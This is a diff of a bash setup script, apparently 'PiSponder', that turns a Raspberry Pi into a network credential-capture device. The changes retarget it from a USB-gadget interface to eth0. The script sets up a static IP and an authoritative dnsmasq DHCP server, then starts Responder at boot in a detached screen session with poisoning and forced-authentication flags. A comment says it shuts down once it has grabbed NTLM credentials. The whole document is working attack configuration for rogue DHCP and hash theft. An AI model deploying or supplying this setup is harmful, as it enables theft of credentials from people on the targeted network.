@@ -1,7 +1,7 @@
 #!/bin/bash
-# This is my first script and it is called "PiSponder"
-# Please tell me what I can improve upon
-# This script will only work on the Raspberry Pi Zero
+# "Veni, Vici, Vidi" - Caesar
+# I found this script on YouTube and tested out with a different setup.
+
 
 if [ $EUID -ne 0 ]; then
 	echo "You must use sudo to run this script:"
@@ -11,17 +11,13 @@ fi
 
 apt-get update
 
-## Setup the PiZero to look like a USB to Ethernet
-cd /boot
-sed -i -r -e 's/(rootwait)/\1 modules-load=dwc2,g_ether/' cmdline.txt
-sed -i -e "\$adtoverlay=dwc2" config.txt
 
-## Configure static IP for usb0
+## Configure static IP for eth0
 cat <<'EOF'>>/etc/network/interfaces
 
-auto usb0
-allow-hotplug usb0
-iface usb0 inet static
+auto eth0
+allow-hotplug eth0
+iface eth0 inet static
     address 192.168.200.1
     netmask 255.255.255.0
 EOF
@@ -33,7 +29,7 @@ EOF
 
 cat <<'EOF'>>/etc/dnsmasq.conf
 
-interface=usb0
+interface=eth0
 dhcp-range=192.168.200.2,192.168.200.254,255.255.255.0,1h
 
 dhcp-authoritative
@@ -57,7 +53,7 @@ sed -i '/exit/d' /etc/rc.local
 
 cat <<'EOF'>>/etc/rc.local
 # Start Responder
-/usr/bin/screen -dmS responder bash -c 'cd /opt/responder/; python Responder.py -I usb0 -f -w -r -d -F'
+/usr/bin/screen -dmS responder bash -c 'cd /opt/responder/; python Responder.py -I eth0 -f -w -r -d -F'
 EOF
 
 ## Stop Responder when its done grabbing NTLM creds and shut down PiZero
